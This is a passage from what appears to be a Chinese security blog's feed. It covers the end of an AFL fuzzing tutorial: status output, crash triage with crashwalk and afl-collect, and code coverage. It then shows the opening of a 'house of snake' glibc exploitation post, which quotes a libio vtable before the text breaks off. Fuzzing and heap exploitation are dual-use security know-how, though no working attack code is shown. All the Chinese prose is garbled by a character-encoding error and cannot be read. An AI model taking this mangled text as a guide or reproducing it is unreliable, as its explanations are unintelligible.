0</span><br><span class="line">execs_done        : 24</span><br><span class="line">execs_per_sec     : 387.10</span><br><span class="line">paths_total       : 3</span><br><span class="line">paths_favored     : 2</span><br><span class="line">paths_found       : 0</span><br><span class="line">paths_imported    : 0</span><br><span class="line">max_depth         : 1</span><br><span class="line">cur_path          : 0</span><br><span class="line">pending_favs      : 2</span><br><span class="line">pending_total     : 3</span><br><span class="line">variable_paths    : 0</span><br><span class="line">stability         : 100.00%</span><br><span class="line">bitmap_cvg        : 0.05%</span><br><span class="line">unique_crashes    : 0</span><br><span class="line">unique_hangs      : 0</span><br><span class="line">last_path         : 0</span><br><span class="line">last_crash        : 0</span><br><span class="line">last_hang         : 0</span><br><span class="line">execs_since_crash : 24</span><br><span class="line">exec_timeout      : 20</span><br><span class="line">afl_banner        : <span class="built_in">test</span></span><br><span class="line">afl_version       : 2.52b</span><br><span class="line">target_mode       : qemu </span><br><span class="line">command_line      : ./afl-fuzz -i ./afl_test/input_dir -o ./afl_test/output_dir -Q ./afl_test/<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>ä¸è¿‡è¿™é‡Œæˆ‘åœ¨è¿è¡Œæ—¶catå‡ æ¬¡å†…å®¹éƒ½æ²¡æœ‰å‘ç”Ÿå˜åŒ–æ‰€ä»¥æˆ‘çŒœæµ‹åº”è¯¥æ˜¯è¿è¡Œå¼€å§‹æ—¶äº§ç”Ÿï¼Œè¿è¡Œç»“æŸæ—¶æ‰ä¿®æ”¹å†…å®¹ã€‚é‚£ä¹ˆå¦‚æœæƒ³è¦å®æ—¶çš„æŸ¥çœ‹è¿è¡Œæƒ…å†µçš„è¯å¯ä»¥ç”¨<code>afl-whatsup</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">âœ  afl-2.52b ./afl-whatsup ./afl_test</span><br><span class="line">status check tool <span class="keyword">for</span> afl-fuzz by &lt;lcamtuf@google.com&gt;</span><br><span class="line"></span><br><span class="line">Individual fuzzers</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="built_in">test</span> (0 days, 0 hrs) &lt;&lt;&lt;</span><br><span class="line"></span><br><span class="line">  <span class="string">cycle 1, lifetime speed 2 execs/sec, path 0/3 (0%)</span></span><br><span class="line"><span class="string">  pending 2/3, coverage 0.05%, no crashes yet</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Summary stats</span></span><br><span class="line"><span class="string">=============</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       Fuzzers alive : 1</span></span><br><span class="line"><span class="string">      Total run time : 0 days, 0 hours</span></span><br><span class="line"><span class="string">         Total execs : 0 million</span></span><br><span class="line"><span class="string">    Cumulative speed : 2 execs/sec</span></span><br><span class="line"><span class="string">       Pending paths : 2 faves, 3 total</span></span><br><span class="line"><span class="string">       Crashes found : 0 locally unique</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">âœ  afl-2.52b ./afl-whatsup ./afl_test</span></span><br><span class="line"><span class="string">status check tool for afl-fuzz by &lt;lcamtuf@google.com&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Individual fuzzers</span></span><br><span class="line"><span class="string">==================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt;&gt;&gt; test (0 days, 0 hrs) &lt;&lt;&lt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  cycle</span> 96, lifetime speed 1480 execs/sec, path 3/4 (75%)</span><br><span class="line">  pending 0/0, coverage 0.05%, crash count 3 (!)</span><br><span class="line"></span><br><span class="line">Summary stats</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">       Fuzzers alive : 1</span><br><span class="line">      Total run time : 0 days, 0 hours</span><br><span class="line">         Total execs : 0 million</span><br><span class="line">    Cumulative speed : 1480 execs/sec</span><br><span class="line">       Pending paths : 0 faves, 0 total</span><br><span class="line">       Crashes found : 3 locally unique</span><br></pre></td></tr></table></figure><p>è™½ç„¶ä½†æ˜¯ï¼Œæˆ‘æ„Ÿè§‰æˆ‘è¿™é‡Œå¥½åƒä½¿ç”¨æœ‰é—®é¢˜ï¼Œä½†æ˜¯å…ˆä¸ç®¡é‚£ä¹ˆå¤šäº†ã€‚</p><p>å†ç®€å•ä»‹ç»ä¸€ä¸‹<code>afl-plot</code>ï¼Œè¿™ä¸ªå·¥å…·æ€»ç»“å‡ºæ¥çš„å†…å®¹æ›´ä¸ºç›´è§‚ï¼Œå¯ä»¥ç›´æ¥å›¾å½¢åŒ–æ˜¾ç¤ºã€‚è¿™é‡Œå­˜åœ¨ä¸€å®šä¾èµ–é—®é¢˜</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gnuplot</span><br><span class="line">afl-plot afl_state_dir graph_output_dir</span><br></pre></td></tr></table></figure><p>ä¸‹é¢å°±æ˜¯è¾“å‡ºå‡ºæ¥çš„ç»“æœï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿™é‡Œçš„<code>total paths</code>æ²¡æœ‰æ˜¾ç¤ºï¼Œæˆ‘çŒœæµ‹å¯èƒ½æ˜¯å› ä¸ºè¿™é‡Œä¸æ˜¯ä½¿ç”¨<code>afl-gcc</code>è¿›è¡Œç¼–è¯‘æˆ–è€…å°±æ˜¯æˆ‘çš„ç”µè„‘æ€§èƒ½å¤ªæ‹‰äº†ã€‚è¿™é‡Œçš„<code>uniq crashes</code>å¼€å§‹åœ¨å¢åŠ éšåé€æ¸è¶‹äºå¹³ç¨³ã€‚æœ€åä¸€ä¸ªå°±æ˜¯æ‰§è¡Œé€Ÿåº¦ï¼Œéšç€æ—¶é—´çš„æ¨ç§»ä¹Ÿæ˜¯è¶Šæ¥è¶Šæ…¢äº†ï¼Œå½“ç„¶ä¹Ÿå¯èƒ½æ˜¯å› ä¸ºå ç”¨äº†å¤ªå¤šçš„ç³»ç»Ÿèµ„æºã€‚<img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323142824705.png"                      alt="image-20230323142824705"                ></p><p>ç„¶åå†è¯´è¯´pythiaæ’ä»¶å§ï¼Œè¿™ä¸ªæ’ä»¶å¯ä»¥çœ‹åˆ°å‘ç°æ–°çš„crashå’Œpathçš„æ¦‚ç‡ã€‚ä»–ä¸åŸç‰ˆä¹Ÿåªæ˜¯å·®äº†å‡ ä¸ªå­—æ®µã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323153710947.png"                      alt="image-20230323153710947"                ></p><p>è¿™é‡Œåœ¨<code>process timing</code>é‡Œé¢æ¡†ä¸­å‡ºç°äº†ä¸¤ä¸ªæ–°çš„å­—æ®µåˆ†åˆ«æ˜¯<code>correctiness</code>å’Œ<code>fuzzability</code>ï¼Œä»–ä»¬çš„å«ä¹‰åˆ†åˆ«æ˜¯åœ¨æ²¡æœ‰å‘ç°crashæ—¶ï¼Œå‘ç°ä¸€ä¸ªå¯¼è‡´crashè¾“å…¥çš„æ¦‚ç‡ï¼Œè¡¨ç¤ºåœ¨è¯¥ç¨‹åºä¸­å‘ç°æ–°è·¯å¾„çš„éš¾åº¦ï¼Œè¯¥æ•°å€¼è¶Šé«˜ä»£è¡¨ç¨‹åºè¶Šå®¹æ˜“Fuzzã€‚åœ¨<code>overall results</code>æ¡†ä¸­ä¹Ÿå¤šäº†ä¸¤ä¸ªï¼Œç¬¬ä¸€ä¸ªæ˜¯å½“å‰å‘ç°çš„è·¯å¾„ï¼Œä¸€ä¸ªæ˜¯è·¯å¾„è¦†ç›–ç‡ã€‚</p><h2 id="ä½•æ—¶å…³é—­fuzz"><a href="#ä½•æ—¶å…³é—­fuzz" class="headerlink" title="ä½•æ—¶å…³é—­fuzz"></a>ä½•æ—¶å…³é—­fuzz</h2><p>ç”¨è¿‡å°±èƒ½çŸ¥é“çš„æ˜¯fuzzå…¶å®æ˜¯æ— é™æ‰§è¡Œä¸‹å»çš„ï¼Œè¿™é‡Œå¯ä»¥ç”¨ä¸Šé¢çš„å‡ ç§æ–¹æ³•æ¥è§‚å¯Ÿæ˜¯å¦è¯¥ç»“æŸï¼Œå½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥åœ¨åŸå§‹çš„AFLä¸­çœ‹åˆ°ä½•æ—¶è¯¥ç»“æŸï¼Œæ³¨æ„è¿™é‡Œ<code>cycles done</code>çš„é¢œè‰²ï¼Œåœ¨fuzzçš„è¿‡ç¨‹ä¸­è¿™ä¸ªé¢œè‰²æ˜¯ä¸€ç›´ä¼šå˜åŒ–çš„ï¼Œå¯ä»¥çœ‹åˆ°ä¸Šé¢çš„å›¾ä¸­é¢œè‰²ä¸ºç´«è‰²ï¼Œè¿™é‡Œä¸ºè“è‰²ã€‚æ‰€ä»¥ä»–çš„å˜åŒ–é¡ºåºä¸ºç´«è‰²-&gt;é»„è‰²-&gt;è“è‰²-&gt;ç»¿è‰²ï¼Œå½“ä¸ºç»¿è‰²æ˜¯å°±ä»£è¡¨å¾ˆéš¾å†æ‰¾åˆ°æ–°çš„crashäº†ï¼Œè€Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ç»“æŸäº†ã€‚(ä¸‹å›¾ä¸ºè“è‰²ä¸»è¦æ˜¯å—æˆ‘ç”µè„‘æ€§èƒ½å½±å“çš„)<img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323140202009.png"                      alt="image-20230323140202009"                ></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">âœ  output_dir tree</span><br><span class="line">.</span><br><span class="line">â”œâ”€â”€ crashes</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ id:000000,sig:06,src:000001,op:havoc,rep:64</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ id:000001,sig:11,src:000000,op:flip1,pos:1</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ id:000002,sig:11,src:000000,op:havoc,rep:16</span><br><span class="line">â”‚Â Â  â””â”€â”€ README.txt</span><br><span class="line">â”œâ”€â”€ fuzz_bitmap</span><br><span class="line">â”œâ”€â”€ fuzzer_stats</span><br><span class="line">â”œâ”€â”€ hangs</span><br><span class="line">â”œâ”€â”€ plot_data</span><br><span class="line">â””â”€â”€ queue</span><br><span class="line">    â”œâ”€â”€ id:000000,orig:in.txt</span><br><span class="line">    â”œâ”€â”€ id:000001,orig:in1.txt</span><br><span class="line">    â”œâ”€â”€ id:000002,orig:in2.txt</span><br><span class="line">    â””â”€â”€ id:000003,src:000001,op:arith8,pos:0,val:-27,+cov</span><br></pre></td></tr></table></figure><p>queueï¼šå­˜æ”¾æ‰€æœ‰å…·æœ‰ç‹¬ç‰¹æ‰§è¡Œè·¯å¾„çš„æµ‹è¯•ç”¨ä¾‹ã€‚<br>crashesï¼šå¯¼è‡´ç›®æ ‡æ¥æ”¶è‡´å‘½signalè€Œå´©æºƒçš„ç‹¬ç‰¹æµ‹è¯•ç”¨ä¾‹ã€‚<br>crashes/README.txtï¼šä¿å­˜äº†ç›®æ ‡æ‰§è¡Œè¿™äº›crashæ–‡ä»¶çš„å‘½ä»¤è¡Œå‚æ•°ã€‚<br>hangsï¼šå¯¼è‡´ç›®æ ‡è¶…æ—¶çš„ç‹¬ç‰¹æµ‹è¯•ç”¨ä¾‹ã€‚<br>fuzzer_statsï¼šafl-fuzzçš„è¿è¡ŒçŠ¶æ€ã€‚<br>plot_dataï¼šç”¨äºafl-plotç»˜å›¾ã€‚</p><h2 id="å¤„ç†æµ‹è¯•ç»“æœ"><a href="#å¤„ç†æµ‹è¯•ç»“æœ" class="headerlink" title="å¤„ç†æµ‹è¯•ç»“æœ"></a>å¤„ç†æµ‹è¯•ç»“æœ</h2><p>è¿™é‡Œåªä»‹ç»ä¸¤ç§æ–¹å¼ï¼Œä¸€æ˜¯<code>crashwalk</code>å†å°±æ˜¯<code>afl-collect</code></p><h3 id="crashwalk"><a href="#crashwalk" class="headerlink" title="crashwalk"></a>crashwalk</h3><p>å®‰è£…è¿‡ç¨‹è¿™é‡Œå°±ä¸å†è¯´äº†ï¼Œç½‘ä¸Šå¾ˆå¤šï¼Œæœæœå°±æœ‰ã€‚</p><p>é¦–å…ˆè¿™ä¸ªæœ‰ä¸¤ç§æ¨¡å¼ï¼Œä¸€æ˜¯<code>Manual Mode</code>å…¶æ¬¡å°±æ˜¯<code>AFL Mode</code>ï¼Œä»–ä»¬çš„å‘½ä»¤æ–°å¼åˆ†åˆ«å¦‚ä¸‹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/tools/go/bin/cwtriage -root syncdir/fuzzer1/crashes/ -match id -- ~/parse @@</span><br><span class="line">~/tools/go/bin/cwtriage -root syncdir -afl</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323190851304.png"                      alt="image-20230323190851304"                ></p><p>è¿™é‡Œä½¿ç”¨çš„æ˜¯ç¬¬ä¸€ç§æ–¹å¼(ç”¨AFLæ—¶æˆ‘è¿™é‡Œä¼šå‡ºç°æ— æ³•<code>no crash detected</code>é”™è¯¯)ã€‚</p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„æè¿°ä¸­å†™ä¸Šäº†æ ˆæº¢å‡ºæ¼æ´ã€‚</p><h3 id="afl-collect"><a href="#afl-collect" class="headerlink" title="afl-collect"></a>afl-collect</h3><p>è¿™ä¸ªå·¥å…·ä½¿ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ./afl-collect -j 8 -d crashes.db -e gdb_script ./afl_sync_dir ./collection_dir --  /path/to/target --target-opts</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323195200830.png"                      alt="image-20230323195200830"                ></p><p>ç»“æœæ¯”ä¸Šé¢çš„æ›´ä¸ºç›´è§‚ã€‚</p><h2 id="ä»£ç è¦†ç›–ç‡"><a href="#ä»£ç è¦†ç›–ç‡" class="headerlink" title="ä»£ç è¦†ç›–ç‡"></a>ä»£ç è¦†ç›–ç‡</h2><p>ä»£ç è¦†ç›–ç‡æ˜¯æ¨¡ç³Šæµ‹è¯•ä¸­ä¸€ä¸ªæå…¶é‡è¦çš„æ¦‚å¿µï¼Œä½¿ç”¨ä»£ç è¦†ç›–ç‡å¯ä»¥è¯„ä¼°å’Œæ”¹è¿›æµ‹è¯•è¿‡ç¨‹ï¼Œæ‰§è¡Œåˆ°çš„ä»£ç è¶Šå¤šï¼Œæ‰¾åˆ°bugçš„å¯èƒ½æ€§å°±è¶Šå¤§ï¼Œæ¯•ç«Ÿï¼Œåœ¨è¦†ç›–çš„ä»£ç ä¸­å¹¶ä¸èƒ½100%å‘ç°bugï¼Œåœ¨æœªè¦†ç›–çš„ä»£ç ä¸­å´æ˜¯100%æ‰¾ä¸åˆ°ä»»ä½•bugçš„ï¼Œæ‰€ä»¥æœ¬èŠ‚ä¸­å°±å°†è¯¦ç»†ä»‹ç»ä»£ç è¦†ç›–ç‡çš„ç›¸å…³æ¦‚å¿µã€‚</p><p>ä»£ç è¦†ç›–ç‡æ˜¯ä¸€ç§åº¦é‡ä»£ç çš„è¦†ç›–ç¨‹åº¦çš„æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯æŒ‡æºä»£ç ä¸­çš„æŸè¡Œä»£ç æ˜¯å¦å·²æ‰§è¡Œï¼›å¯¹äºŒè¿›åˆ¶ç¨‹åºï¼Œè¿˜å¯å°†æ­¤æ¦‚å¿µç†è§£ä¸ºæ±‡ç¼–ä»£ç ä¸­çš„æŸæ¡æŒ‡ä»¤æ˜¯å¦å·²æ‰§è¡Œã€‚å…¶è®¡é‡æ–¹å¼å¾ˆå¤šï¼Œä½†æ— è®ºæ˜¯GCCçš„GCOVè¿˜æ˜¯LLVMçš„SanitizerCoverageï¼Œéƒ½æä¾›å‡½æ•°ï¼ˆfunctionï¼‰ã€åŸºæœ¬å—ï¼ˆbasic-blockï¼‰ã€è¾¹ç•Œï¼ˆedgeï¼‰ä¸‰ç§çº§åˆ«çš„è¦†ç›–ç‡æ£€æµ‹ï¼Œæ›´å…·ä½“çš„ç»†èŠ‚å¯ä»¥å‚è€ƒLLVMçš„<a class="link"   href="https://clang.llvm.org/docs/SanitizerCoverage.html" >å®˜æ–¹æ–‡æ¡£<i class="fas fa-external-link-alt"></i></a>ã€‚</p><h3 id="åŸºæœ¬å—"><a href="#åŸºæœ¬å—" class="headerlink" title="åŸºæœ¬å—"></a>åŸºæœ¬å—</h3><blockquote><p>åªæœ‰ä¸€ä¸ªå…¥å£ç‚¹ï¼ŒBBä¸­çš„æŒ‡ä»¤ä¸æ˜¯ä»»ä½•<strong>è·³è½¬æŒ‡ä»¤</strong>çš„ç›®æ ‡ã€‚</p><p>åªæœ‰ä¸€ä¸ªé€€å‡ºç‚¹ï¼Œåªæœ‰æœ€åä¸€æ¡æŒ‡ä»¤ä½¿æ‰§è¡Œæµç¨‹è½¬ç§»åˆ°å¦ä¸€ä¸ªBB</p></blockquote><p>å¦‚ä¸‹å›¾ä¸­çš„ä»£ç å°±å¯ä»¥è¢«åˆ‡å‰²ä¸º4ä¸ªåŸºæœ¬å—ï¼Œå¹³æ—¶æˆ‘ä»¬åœ¨IDAå›¾å½¢æ¨¡å¼ä¸­çœ‹åˆ°çš„å°±æ˜¯ä¸€ä¸ªä¸€ä¸ªçš„åŸºæœ¬å—<img                       lazyload                     src="/images/loading.svg"                     data-src="/images/1552285577000-006tNc79gy1fz1gm5zohnj30sj0ikahx.jpg-w331s.jpg"                                     ></p><p>æ‹¿ä¸€ä¸ªç¨‹åºä¸¾ä¾‹ï¼Œåœ¨idaä¸­æ¯ä¸€å—å°±ä»£è¡¨ä¸€ä¸ªåŸºæœ¬å—ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323200531347.png"                      alt="image-20230323200531347"                ></p><h3 id="è¾¹"><a href="#è¾¹" class="headerlink" title="è¾¹"></a>è¾¹</h3><p>ä¾æ—§æ˜¯ä¸Šé¢idaçš„å›¾ï¼Œæ¯ä¸€æ¡çº¿ï¼Œä¹Ÿå°±æ˜¯æ¯ä¸€ä¸ªç®­å¤´å°±ä»£è¡¨ä¸€ä¸ªè¾¹ã€‚</p><h3 id="å…ƒç»„"><a href="#å…ƒç»„" class="headerlink" title="å…ƒç»„"></a>å…ƒç»„</h3><p>åœ¨AFLä¸­ï¼Œä½¿ç”¨äºŒå…ƒç»„(branch_src, branch_dst)æ¥è®°å½•<strong>å½“å‰åŸºæœ¬å—</strong> + <strong>å‰ä¸€åŸºæœ¬å—</strong>çš„ä¿¡æ¯ï¼Œä»è€Œè·å–ç›®æ ‡çš„æ‰§è¡Œæµç¨‹å’Œä»£ç è¦†ç›–æƒ…å†µï¼Œä¼ªä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;            <span class="comment">//ç”¨ä¸€ä¸ªéšæœºæ•°æ ‡è®°å½“å‰åŸºæœ¬å—</span></span><br><span class="line">shared_mem[cur_location ^ prev_location]++;        <span class="comment">//å°†å½“å‰å—å’Œå‰ä¸€å—å¼‚æˆ–ä¿å­˜åˆ°shared_mem[]</span></span><br><span class="line">prev_location = cur_location &gt;&gt; <span class="number">1</span>;                <span class="comment">//cur_locationå³ç§»1ä½åŒºåˆ†ä»å½“å‰å—åˆ°å½“å‰å—çš„è½¬è·³</span></span><br></pre></td></tr></table></figure><p>å®é™…æ’å…¥çš„æ±‡ç¼–ä»£ç ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œé¦–å…ˆä¿å­˜å„ç§å¯„å­˜å™¨çš„å€¼å¹¶è®¾ç½®rcxï¼Œç„¶åè°ƒç”¨<code>__afl_maybe_log</code>ï¼Œè¿™ä¸ªæ–¹æ³•çš„å†…å®¹ç›¸å½“å¤æ‚ï¼Œè¿™é‡Œå°±ä¸å±•å¼€è®²äº†ï¼Œä½†å…¶ä¸»è¦åŠŸèƒ½å°±å’Œä¸Šé¢çš„ä¼ªä»£ç ç›¸ä¼¼ï¼Œç”¨äºè®°å½•è¦†ç›–ç‡ï¼Œæ”¾å…¥ä¸€å—å…±äº«å†…å­˜ä¸­ã€‚<img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323200655405.png"                      alt="image-20230323200655405"                ></p><h2 id="è®¡ç®—ä»£ç è¦†ç›–ç‡"><a href="#è®¡ç®—ä»£ç è¦†ç›–ç‡" class="headerlink" title="è®¡ç®—ä»£ç è¦†ç›–ç‡"></a>è®¡ç®—ä»£ç è¦†ç›–ç‡</h2><p>è¿™é‡Œè®¡ç®—ä»£ç è¦†ç›–ç‡ä¸»è¦æ˜¯ä»‹ç»ä¸¤ä¸ªå·¥å…·ï¼Œä¸€æ˜¯GCOVå¦ä¸€ä¸ªåˆ™æ˜¯LCOVå®ƒæ˜¯GCOVçš„å‰ç«¯ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323214327472.png"                      alt="image-20230323214327472"                ></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰è¦†ç›–ç‡ä¹‹ç±»çš„ä¸œè¥¿ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥åœ¨ç½‘é¡µä¸­æ‰“å¼€</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323214409463.png"                      alt="image-20230323214409463"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323214533298.png"                      alt="image-20230323214533298"                ></p><p>ç‚¹å¼€æ–‡ä»¶ä¼šæœ‰æ›´ä¸ºè¯¦ç»†çš„æ•°æ®ï¼Œæ¯è¡Œä»£ç å‰çš„æ•°å­—ä»£è¡¨è¢«æ‰§è¡Œçš„æ¬¡æ•°ï¼Œå…¶ä¸­çº¢è‰²çš„ä»£è¡¨æœªæ‰§è¡Œè¿‡çš„ã€‚</p><hr><p>å‚è€ƒé“¾æ¥:<br>    <a class="link"   href="https://paper.seebug.org/842/#4-afl-collect" >https://paper.seebug.org/842/#4-afl-collect<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æœ¬æ¥ä¸æ‰“ç®—åšAFLçš„æºç åˆ†æï¼Œä½†æ˜¯çœ‹åˆ°äº†ä¸€ç¯‡æ–‡ç« å¸å¼•åˆ°äº†æˆ‘ï¼Œå½“ç„¶è¿™ç¯‡æ–‡ç« è¿˜æ˜¯ä¸ä¼šæ¶‰åŠåˆ°æºç åˆ†æï¼Œåœ¨åç»­çš„FUZZç›¸å…³æ–‡ç« ä¸­ä¼šè¿›è¡Œè¿›ä¸€æ­¥åˆ†æã€‚&lt;/p&gt;
&lt;h2 id=&quot;fuzzerå·¥ä½œçŠ¶æ€&quot;&gt;&lt;a href=&quot;#fuzzerå·¥ä½œçŠ¶æ€&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    <category term="FUZZ" scheme="https://cv196082.gitee.io/categories/FUZZ/"/>
    
    
    <category term="AFL" scheme="https://cv196082.gitee.io/tags/AFL/"/>
    
    <category term="FUZZ" scheme="https://cv196082.gitee.io/tags/FUZZ/"/>
    
  </entry>
  
  <entry>
    <title>house of snake</title>
    <link href="https://cv196082.gitee.io/2023/03/22/house-of-snake/"/>
    <id>https://cv196082.gitee.io/2023/03/22/house-of-snake/</id>
    <published>2023-03-22T05:32:33.000Z</published>
    <updated>2023-03-23T12:11:46.982Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™house ofç³»åˆ—æ˜¯çœŸçš„å¤šï¼Œä¸Šä¸€ä¸ªè¿˜æ²¡æ‚çƒ­ä¸‹ä¸€ä¸ªå°±æ¥äº†ï¼Œglibcæ›´æ–°ä¹Ÿæ˜¯çœŸå¿«ã€‚ä¸è¿‡èƒ½åœ¨å­¦ä¹ æ–°ä¸œè¥¿çš„é€”ä¸­æ°´ä¸€ç¯‡æ–‡ç« è¿˜æ˜¯ç›¸å½“ä¸é”™çš„ã€‚</p><h2 id="èƒŒæ™¯ä»‹ç»"><a href="#èƒŒæ™¯ä»‹ç»" class="headerlink" title="èƒŒæ™¯ä»‹ç»"></a>èƒŒæ™¯ä»‹ç»</h2><p>åœ¨glibc2.37ä¸­<code>_IO_obstack_jumps</code>è¢«åˆ é™¤å•¦ï¼Œå¯¼è‡´å‰ä¸€ç¯‡çš„åˆ©ç”¨æ–¹å¼æ— äº†ã€‚</p><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>è¿™æ¬¡èšç„¦çš„vtableæ˜¯:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_printf_buffer_as_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, __printf_buffer_as_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, __printf_buffer_as_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œåªæœ‰ä¸¤ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”æˆ‘ä»¬çœŸæ­£ä½¿ç”¨çš„åªæœ‰ç¬¬ä¸€ä¸ªå‡½æ•°:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span 